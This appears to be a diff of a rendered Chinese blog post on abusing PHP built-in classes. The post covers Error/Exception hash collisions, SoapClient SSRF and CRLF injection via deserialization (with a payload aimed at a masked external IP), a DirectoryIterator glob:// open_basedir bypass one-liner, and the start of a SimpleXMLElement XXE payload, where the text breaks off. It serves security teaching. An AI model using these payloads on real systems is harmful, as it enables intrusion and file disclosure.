 <li><code>Error::__clone</code> — 克隆 error</li>
 </ul>
-<h6 id="exception-类" class="heading-element"><span>0.0.0.4.2  Exception 类</span>
+<h2 id="exception-类" class="heading-element"><span>Exception 类</span>
   <a href="#exception-%e7%b1%bb" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><p><strong>Exception</strong> 是所有异常的基类，该类是在PHP 5.0.0 中开始引入的。</p>
+</h2><p><strong>Exception</strong> 是所有异常的基类，该类是在PHP 5.0.0 中开始引入的。</p>
 <p><strong>类摘要：</strong></p>
 <div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#58a1dd">Exception</span> {
 </span></span><span style="display:flex;"><span>  <span style="color:#828b96;font-style:italic">/* 属性 */</span>
@@ -415,7 +432,7 @@
 </span></span><span style="display:flex;"><span><span style="color:#ff636f">echo</span> <span style="color:#58a1dd">$a</span>;</span></span></code></pre></div><p>输出如下：</p>
 <div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#58a1dd">Error</span><span style="color:#ff636f">:</span> <span style="color:#58a1dd">payload</span> <span style="color:#58a1dd">in</span> <span style="color:#ff636f">/</span><span style="color:#58a1dd">usercode</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">file</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">php</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">2</span>
 </span></span><span style="display:flex;"><span><span style="color:#58a1dd">Stack</span> <span style="color:#58a1dd">trace</span><span style="color:#ff636f">:</span>
-</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#####0 {main}
+</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#0 {main}
 </span></span></span></code></pre></div><p>发现这将会以字符串的形式输出当前报错，包含当前的错误信息（&ldquo;payload&rdquo;）以及当前报错的行号（&ldquo;2&rdquo;），而传入 <code>Error(&quot;payload&quot;,1)</code> 中的错误代码“1”则没有输出出来。</p>
 <p>在来看看下一个例子：</p>
 <div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff636f">&lt;?</span><span style="color:#58a1dd">php</span>
@@ -425,22 +442,22 @@
 </span></span><span style="display:flex;"><span><span style="color:#ff636f">echo</span> <span style="color:#58a1dd">$b</span>;</span></span></code></pre></div><p>输出如下：</p>
 <div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#58a1dd">Error</span><span style="color:#ff636f">:</span> <span style="color:#58a1dd">payload</span> <span style="color:#58a1dd">in</span> <span style="color:#ff636f">/</span><span style="color:#58a1dd">usercode</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">file</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">php</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">2</span>
 </span></span><span style="display:flex;"><span><span style="color:#58a1dd">Stack</span> <span style="color:#58a1dd">trace</span><span style="color:#ff636f">:</span>
-</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#####0 {main}
+</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#0 {main}
 </span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span>
 </span></span><span style="display:flex;"><span><span style="color:#58a1dd">Error</span><span style="color:#ff636f">:</span> <span style="color:#58a1dd">payload</span> <span style="color:#58a1dd">in</span> <span style="color:#ff636f">/</span><span style="color:#58a1dd">usercode</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">file</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">php</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">2</span>
 </span></span><span style="display:flex;"><span><span style="color:#58a1dd">Stack</span> <span style="color:#58a1dd">trace</span><span style="color:#ff636f">:</span>
-</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#####0 {main}
+</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#0 {main}
 </span></span></span></code></pre></div><p>可见，<code>$a</code> 和 <code>$b</code> 这两个错误对象本身是不同的，但是 ==__toString方法返回的结果是相同的==。注意，这里之所以需要在同一行是因为 <code>__toString</code> 返回的数据包含当前行号。</p>
 <p>Exception 类与 Error 的使用和结果完全一样，只不过 <code>Exception</code> 类适用于PHP 5和7，而 <code>Error</code> 只适用于 PHP 7。</p>
-<h5 id="使用soapclient类进行ssrf" class="heading-element"><span>0.0.0.5  <strong>使用SoapClient类进行SSRF</strong></span>
+<h1 id="使用soapclient类进行ssrf" class="heading-element"><span><strong>使用SoapClient类进行SSRF</strong></span>
   <a href="#%e4%bd%bf%e7%94%a8soapclient%e7%b1%bb%e8%bf%9b%e8%a1%8cssrf" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h5><h6 id="soapclient-类" class="heading-element"><span>0.0.0.5.1  SoapClient 类</span>
+</h1><h2 id="soapclient-类" class="heading-element"><span>SoapClient 类</span>
   <a href="#soapclient-%e7%b1%bb" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><p>PHP 的内置类 SoapClient 是一个专门用来访问web服务的类，可以提供一个基于SOAP协议访问Web服务的 PHP 客户端。</p>
+</h2><p>PHP 的内置类 SoapClient 是一个专门用来访问web服务的类，可以提供一个基于SOAP协议访问Web服务的 PHP 客户端。</p>
 <p>类摘要如下：</p>
 <div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#58a1dd">SoapClient</span> {  <span style="color:#828b96;font-style:italic">/* 方法 */</span>  <span style="color:#ff636f">public</span> <span style="color:#58a1dd">__construct</span> ( <span style="color:#58a1dd">string</span><span style="color:#ff636f">|</span><span style="color:#ff636f">null</span> <span style="color:#58a1dd">$wsdl</span> , <span style="color:#ff636f">array</span> <span style="color:#58a1dd">$options</span> <span style="color:#ff636f">=</span> [] )  <span style="color:#ff636f">public</span> <span style="color:#58a1dd">__call</span> ( <span style="color:#58a1dd">string</span> <span style="color:#58a1dd">$name</span> , <span style="color:#ff636f">array</span> <span style="color:#58a1dd">$args</span> ) <span style="color:#ff636f">:</span> <span style="color:#58a1dd">mixed</span>  <span style="color:#ff636f">public</span> <span style="color:#58a1dd">__doRequest</span> ( <span style="color:#58a1dd">string</span> <span style="color:#58a1dd">$request</span> , <span style="color:#58a1dd">string</span> <span style="color:#58a1dd">$location</span> , <span style="color:#58a1dd">string</span> <span style="color:#58a1dd">$action</span> , <span style="color:#58a1dd">int</span> <span style="color:#58a1dd">$version</span> , <span style="color:#58a1dd">bool</span> <span style="color:#58a1dd">$oneWay</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">false</span> ) <span style="color:#ff636f">:</span> <span style="color:#58a1dd">string</span><span style="color:#ff636f">|</span><span style="color:#ff636f">null</span>  <span style="color:#ff636f">public</span> <span style="color:#58a1dd">__getCookies</span> ( ) <span style="color:#ff636f">:</span> <span style="color:#ff636f">array</span>  <span style="color:#ff636f">public</span> <span style="color:#58a1dd">__getFunctions</span> ( ) <span style="color:#ff636f">:</span> <span style="color:#ff636f">array</span><span style="color:#ff636f">|</span><span style="color:#ff636f">null</span>  <span style="color:#ff636f">public</span> <span style="color:#58a1dd">__getLastRequest</span> ( ) <span style="color:#ff636f">:</span> <span style="color:#58a1dd">string</span><span style="color:#ff636f">|</span><span style="color:#ff636f">null</span>  <span style="color:#ff636f">public</span> <span style="color:#58a1dd">__getLastRequestHeaders</span> ( ) <span style="color:#ff636f">:</span> <span style="color:#58a1dd">string</span><span style="color:#ff636f">|</span><span style="color:#ff636f">null</span>  <span style="color:#ff636f">public</span> <span style="color:#58a1dd">__getLastResponse</span> ( ) <span style="color:#ff636f">:</span> <span style="color:#58a1dd">string</span><span style="color:#ff636f">|</span><span style="color:#ff636f">null</span>  <span style="color:#ff636f">public</span> <span style="color:#58a1dd">__getLastResponseHeaders</span> ( ) <span style="color:#ff636f">:</span> <span style="color:#58a1dd">string</span><span style="color:#ff636f">|</span><span style="color:#ff636f">null</span>  <span style="color:#ff636f">public</span> <span style="color:#58a1dd">__getTypes</span> ( ) <span style="color:#ff636f">:</span> <span style="color:#ff636f">array</span><span style="color:#ff636f">|</span><span style="color:#ff636f">null</span>  <span style="color:#ff636f">public</span> <span style="color:#58a1dd">__setCookie</span> ( <span style="color:#58a1dd">string</span> <span style="color:#58a1dd">$name</span> , <span style="color:#58a1dd">string</span><span style="color:#ff636f">|</span><span style="color:#ff636f">null</span> <span style="color:#58a1dd">$value</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">null</span> ) <span style="color:#ff636f">:</span> <span style="color:#58a1dd">void</span>  <span style="color:#ff636f">public</span> <span style="color:#58a1dd">__setLocation</span> ( <span style="color:#58a1dd">string</span> <span style="color:#58a1dd">$location</span> <span style="color:#ff636f">=</span> <span style="color:#a6be9d">&#34;&#34;</span> ) <span style="color:#ff636f">:</span> <span style="color:#58a1dd">string</span><span style="color:#ff636f">|</span><span style="color:#ff636f">null</span>  <span style="color:#ff636f">public</span> <span style="color:#58a1dd">__setSoapHeaders</span> ( <span style="color:#58a1dd">SoapHeader</span><span style="color:#ff636f">|</span><span style="color:#ff636f">array</span><span style="color:#ff636f">|</span><span style="color:#ff636f">null</span> <span style="color:#58a1dd">$headers</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">null</span> ) <span style="color:#ff636f">:</span> <span style="color:#58a1dd">bool</span>  <span style="color:#ff636f">public</span> <span style="color:#58a1dd">__soapCall</span> ( <span style="color:#58a1dd">string</span> <span style="color:#58a1dd">$name</span> , <span style="color:#ff636f">array</span> <span style="color:#58a1dd">$args</span> , <span style="color:#ff636f">array</span><span style="color:#ff636f">|</span><span style="color:#ff636f">null</span> <span style="color:#58a1dd">$options</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">null</span> , <span style="color:#58a1dd">SoapHeader</span><span style="color:#ff636f">|</span><span style="color:#ff636f">array</span><span style="color:#ff636f">|</span><span style="color:#ff636f">null</span> <span style="color:#58a1dd">$inputHeaders</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">null</span> , <span style="color:#ff636f">array</span> <span style="color:#ff636f">&amp;</span><span style="color:#58a1dd">$outputHeaders</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">null</span> ) <span style="color:#ff636f">:</span> <span style="color:#58a1dd">mixed</span>}</span></span></code></pre></div><p>可以看到，该内置类有一个 <code>__call</code> 方法，当 <code>__call</code> 方法被触发后，它可以发送 HTTP 和 HTTPS 请求。正是这个 <code>__call</code> 方法，使得 SoapClient 类可以被我们运用在 SSRF 中。SoapClient 这个类也算是目前被挖掘出来最好用的一个内置类。</p>
 <p>该类的构造函数如下：</p>
@@ -449,11 +466,11 @@
 <li>第二个参数为一个数组，如果在wsdl模式下，此参数可选；如果在非wsdl模式下，则必须设置location和uri选项，其中location是要将请求发送到的SOAP服务器的URL，而uri 是SOAP服务的目标命名空间。</li>
 </ul>
 <p>==SoapClient是php的一个内置类，它本身是存在CRLF和SSRF漏洞的，怎么说呢？这个类可以控制发送请求包，并且headers可控，不仅可控，还可以传入回车+换行（\r\n），那么被回车下去的请求头不就成了post数据。所以我们可以任意构造请求包，另外，当这个类被调用它没有的方法，会触发它的call，引发SSRF漏洞==</p>
-<h6 id="利用" class="heading-element"><span>0.0.0.5.2  利用</span>
+<h2 id="利用" class="heading-element"><span>利用</span>
   <a href="#%e5%88%a9%e7%94%a8" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><p>知道上述两个参数的含义后，就很容易构造出SSRF的利用Payload了。我们可以设置第一个参数为null，然后第二个参数的location选项设置为target_url。</p>
+</h2><p>知道上述两个参数的含义后，就很容易构造出SSRF的利用Payload了。我们可以设置第一个参数为null，然后第二个参数的location选项设置为target_url。</p>
 <p>location是ssrf的利用点</p>
 <div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff636f">&lt;?</span><span style="color:#58a1dd">php</span> <span style="color:#58a1dd">$a</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">new</span> <span style="color:#58a1dd">SoapClient</span>(<span style="color:#ff636f">null</span>,<span style="color:#ff636f">array</span>(<span style="color:#a6be9d">&#39;location&#39;</span><span style="color:#ff636f">=&gt;</span><span style="color:#a6be9d">&#39;http://47.xxx.xxx.72:2333/aaa&#39;</span>, <span style="color:#a6be9d">&#39;uri&#39;</span><span style="color:#ff636f">=&gt;</span><span style="color:#a6be9d">&#39;http://47.xxx.xxx.72:2333&#39;</span>));<span style="color:#58a1dd">$b</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">serialize</span>(<span style="color:#58a1dd">$a</span>);<span style="color:#ff636f">echo</span> <span style="color:#58a1dd">$b</span>;<span style="color:#58a1dd">$c</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">unserialize</span>(<span style="color:#58a1dd">$b</span>);<span style="color:#58a1dd">$c</span><span style="color:#ff636f">-&gt;</span><span style="color:#58a1dd">a</span>();   <span style="color:#828b96;font-style:italic">// 随便调用对象中不存在的方法, 触发__call方法进行ssrf?&gt;
 </span></span></span></code></pre></div><p>但是，由于它==仅限于HTTP/HTTPS协议==，所以用处不是很大。</p>
@@ -471,11 +488,11 @@
 </span></span><span style="display:flex;"><span><span style="color:#58a1dd">$b</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">serialize</span>(<span style="color:#58a1dd">$a</span>);
 </span></span><span style="display:flex;"><span><span style="color:#ff636f">echo</span> <span style="color:#58a1dd">urlencode</span>(<span style="color:#58a1dd">$b</span>);
 </span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">?&gt;</span>
-</span></span></code></pre></div><h5 id="使用-directoryiterator-类绕过-open_basedir" class="heading-element"><span>0.0.0.6  使用 DirectoryIterator 类绕过 open_basedir</span>
+</span></span></code></pre></div><h1 id="使用-directoryiterator-类绕过-open_basedir" class="heading-element"><span>使用 DirectoryIterator 类绕过 open_basedir</span>
   <a href="#%e4%bd%bf%e7%94%a8-directoryiterator-%e7%b1%bb%e7%bb%95%e8%bf%87-open_basedir" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h5><p>DirectoryIterator 类提供了一个用于查看文件系统目录内容的简单接口，该类是在 PHP 5 中增加的一个类。</p>
+</h1><p>DirectoryIterator 类提供了一个用于查看文件系统目录内容的简单接口，该类是在 PHP 5 中增加的一个类。</p>
 <p>DirectoryIterator与glob://协议结合将无视open_basedir对目录的限制，可以用来列举出指定目录下的文件。</p>
 <p>测试代码：</p>
 <div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">// test.php
@@ -485,18 +502,18 @@
 </span></span><span style="display:flex;"><span><span style="color:#ff636f">foreach</span>(<span style="color:#58a1dd">$a</span> <span style="color:#ff636f">as</span> <span style="color:#58a1dd">$f</span>){  
 </span></span><span style="display:flex;"><span>    <span style="color:#ff636f">echo</span>(<span style="color:#58a1dd">$f</span><span style="color:#ff636f">-&gt;</span><span style="color:#58a1dd">__toString</span>()<span style="color:#ff636f">.</span><span style="color:#a6be9d">&#39;&lt;br&gt;&#39;</span>);}
 </span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">?&gt;</span>
-</span></span><span style="display:flex;"><span>##### payload一句话的形式:$a = new DirectoryIterator(&#34;glob:///*&#34;);foreach($a as $f){echo($f-&gt;__toString().&#39;&lt;br&gt;&#39;);}
+</span></span><span style="display:flex;"><span>    # payload一句话的形式:$a = new DirectoryIterator(&#34;glob:///*&#34;);foreach($a as $f){echo($f-&gt;__toString().&#39;&lt;br&gt;&#39;);}
 </span></span></code></pre></div><p>我们输入 <code>/?whoami=glob:///*</code> 即可列出根目录下的文件,但是会发现只能列根目录和open_basedir指定的目录的文件，不能列出除前面的目录以外的目录中的文件，且不能读取文件内容。</p>
-<h5 id="使用simplexmlelement类进行xxe" class="heading-element"><span>0.0.0.7  <strong>使用SimpleXMLElement类进行XXE</strong></span>
+<h1 id="使用simplexmlelement类进行xxe" class="heading-element"><span><strong>使用SimpleXMLElement类进行XXE</strong></span>
   <a href="#%e4%bd%bf%e7%94%a8simplexmlelement%e7%b1%bb%e8%bf%9b%e8%a1%8cxxe" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h5><p>SimpleXMLElement 这个内置类用于解析 XML 文档中的元素。</p>
-<h6 id="simplexmlelement" class="heading-element"><span>0.0.0.7.1  SimpleXMLElement</span>
+</h1><p>SimpleXMLElement 这个内置类用于解析 XML 文档中的元素。</p>
+<h2 id="simplexmlelement" class="heading-element"><span>SimpleXMLElement</span>
   <a href="#simplexmlelement" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><p>通过设置第三个参数 data_is_url 为 <code>true</code>，我们可以实现远程xml文件的载入。第二个参数的常量值我们设置为<code>2</code>即可。第一个参数 data 就是我们自己设置的payload的url地址，即用于引入的外部实体的url。</p>
+</h2><p>通过设置第三个参数 data_is_url 为 <code>true</code>，我们可以实现远程xml文件的载入。第二个参数的常量值我们设置为<code>2</code>即可。第一个参数 data 就是我们自己设置的payload的url地址，即用于引入的外部实体的url。</p>
 <p>这样的话，当我们可以控制目标调用的类的时候，便可以通过 SimpleXMLElement 这个内置类来构造 XXE。</p>
 <div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff636f">&lt;?</span><span style="color:#58a1dd">php</span>
 </span></span><span style="display:flex;"><span><span style="color:#58a1dd">$xml</span> <span style="color:#ff636f">=</span> <span style="color:#a6be9d">&lt;&lt;&lt;</span><span style="color:#a6be9d">EOF</span><span style="color:#a6be9d">
